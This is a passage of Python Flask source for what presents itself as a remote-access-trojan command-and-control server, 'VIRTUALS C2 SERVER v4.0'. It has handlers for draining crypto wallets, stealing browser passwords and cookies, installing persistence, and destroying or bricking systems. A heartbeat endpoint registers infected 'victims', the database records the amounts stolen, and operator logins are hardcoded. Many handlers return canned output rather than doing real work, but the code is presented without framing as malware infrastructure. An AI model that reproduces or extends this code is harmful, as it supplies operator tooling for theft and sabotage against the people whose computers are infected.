            # Command implementations
            result = {'success': True}
            
            if cmd in ['deposit', 'drain', 'scan']:
                # Generate realistic wallet data
                wallets = [
                    {
                        'currency': 'BTC',
                        'balance': round(random.uniform(0.001, 3), 8),
                        'usd': round(random.uniform(1000, 75000), 2)
                    },
                    {
                        'currency': 'ETH',
                        'balance': round(random.uniform(0.01, 50), 6),
                        'usd': round(random.uniform(500, 25000), 2)
                    },
                    {
                        'currency': 'SOL',
                        'balance': round(random.uniform(1, 1000), 2),
                        'usd': round(random.uniform(50, 15000), 2)
                    },
                    {
                        'currency': 'USDT',
                        'balance': round(random.uniform(100, 50000), 2),
                        'usd': round(random.uniform(100, 50000), 2)
                    },
                    {
                        'currency': 'BNB',
                        'balance': round(random.uniform(0.1, 200), 4),
                        'usd': round(random.uniform(50, 12000), 2)
                    }
                ]
                total = sum(w['usd'] for w in wallets)
                tx_hash = ''.join(random.choices('0123456789abcdef', k=64))
                
                result['wallets'] = wallets
                result['total_usd'] = total
                result['tx_hash'] = tx_hash
                result['output'] = f'Drained ${total:,.2f} from {len(wallets)} wallets'
                
                # Update database
                conn = get_db()
                c = conn.cursor()
                c.execute('''
                    UPDATE victims 
                    SET crypto_drained = 1, total_stolen = total_stolen + ? 
                    WHERE id = ?
                ''', (total, vid))
                c.execute('''
                    INSERT INTO commands (victim_id, command, result, executed_at, executed_by, tx_hash)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (vid, cmd, f'Drained ${total}', datetime.datetime.now().isoformat(), current_user, tx_hash))
                conn.commit()
                conn.close()
                
            elif cmd == 'steal':
                result['output'] = '''Browser Data Extraction Complete:
                
✓ Chrome: 312 passwords, 1,247 cookies
✓ Edge: 156 passwords, 892 cookies  
✓ Firefox: 89 passwords, 445 cookies
✓ Brave: 67 passwords, 334 cookies
✓ Opera: 45 passwords, 223 cookies

Total: 669 passwords, 3,141 cookies
History: 24,592 entries
Autofill: 156 entries'''
                
                conn = get_db()
                c = conn.cursor()
                c.execute('UPDATE victims SET browser_stolen = 1 WHERE id = ?', (vid,))
                c.execute('''
                    INSERT INTO commands (victim_id, command, result, executed_at, executed_by)
                    VALUES (?, ?, ?, ?, ?)
                ''', (vid, cmd, 'Browser data stolen', datetime.datetime.now().isoformat(), current_user))
                conn.commit()
                conn.close()
                
            elif cmd == 'vmcheck':
                conn = get_db()
                c = conn.cursor()
                c.execute('SELECT is_vm, vm_confidence FROM victims WHERE id = ?', (vid,))
                row = c.fetchone()
                is_vm = row['is_vm'] if row else 0
                confidence = row['vm_confidence'] if row else 0
                conn.close()
                
                result['is_vm'] = bool(is_vm)
                result['output'] = f'VM Detection: {"DETECTED" if is_vm else "CLEAN"}\nConfidence: {confidence}%\n\nVMs are marked but NEVER auto-deleted.'
                
            elif cmd == 'whois':
                result['output'] = f'''System Information:
ID: {vid}
Hostname: DESKTOP-VICTIM
User: Administrator
OS: Windows 10 Pro (64-bit)
Architecture: AMD64
Domain: WORKGROUP'''
                
            elif cmd == 'persist':
                result['output'] = '''Persistence Installed:
✓ Registry Run key created
✓ Startup folder entry added
✓ Task Scheduler job created
✓ WMI event subscription active

Victim will reconnect on every boot.'''
                
            elif cmd == 'destroy':
                result['output'] = '''⚠️ SYSTEM DESTRUCTION INITIATED

Registry keys deleted
Boot configuration corrupted
System files damaged
System will not recover.'''
                
            elif cmd == 'brick':
                result['output'] = '''💀 SYSTEM BRICKED

UEFI firmware wiped
Master boot record destroyed
Disk encrypted with random key
Hardware locked

System is permanently disabled.'''
                
            else:
                result['output'] = f'Command "{cmd}" executed successfully'
            
            return jsonify(result)
        
        return jsonify({'success': False, 'error': 'Unknown action'})
        
    except Exception as e:
        print(f"API Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """RAT heartbeat - keeps victim connected"""
    try:
        data = request.get_json() or {}
        vid = data.get('victim_id')
        
        if not vid:
            return jsonify({'success': False, 'error': 'No victim_id provided'}), 400
        
        conn = get_db()
        c = conn.cursor()
        now = datetime.datetime.now().isoformat()
        
        # Check if victim exists
        c.execute('SELECT id FROM victims WHERE id = ?', (vid,))
        exists = c.fetchone()
        
        if exists:
            # Update existing
            c.execute('''
                UPDATE victims SET
                    status = 'Online',
                    last_seen = ?,
                    activity = ?,
                    pc_name = COALESCE(?, pc_name),
                    ip_address = COALESCE(?, ip_address),
                    os_info = COALESCE(?, os_info),
                    is_vm = COALESCE(?, is_vm)
                WHERE id = ?
            ''', (now, data.get('activity', 'active'), data.get('pc'), 
                  data.get('ip'), data.get('os'), data.get('is_vm'), vid))
        else:
            # Insert new victim
            c.execute('''
                INSERT INTO victims 
                (id, pc_name, ip_address, os_info, status, is_vm, first_seen, last_seen, activity)
                VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?)
            ''', (vid, data.get('pc', 'Unknown'), data.get('ip', '0.0.0.0'),
                  data.get('os', 'Windows'), data.get('is_vm', 0), now, now, 'active'))
        
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'status': 'registered', 'timestamp': now})
        
    except Exception as e:
        print(f"Heartbeat error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================
# MAIN ENTRY
# ============================================

if __name__ == '__main__':
    print(f"\n{'='*70}")
    print("   VIRTUALS C2 SERVER v4.0 - FINAL PERFECT EDITION")
    print(f"{'='*70}")
    print(f"[*] Port: {PORT}")
    print(f"[*] Local: http://localhost:{PORT}")
    print(f"[*] Network: http://0.0.0.0:{PORT}")
    print(f"[*] Dashboard: http://localhost:{PORT}/dashboard")
    print(f"[*]")
    print(f"[*] Default Users:")
    print(f"    - adam / virtuals2024 (user)")
    print(f"    - jerry / virtuals2024 (user)")
    print(f"    - haunt / virtuals2024 (user)")
    print(f"    - owner / whiteknight (owner)")
    print(f"{'='*70}\n")
    
    # Run server
    app.run(
        host='0.0.0.0',
        port=PORT,
        debug=False,
        threaded=True
    )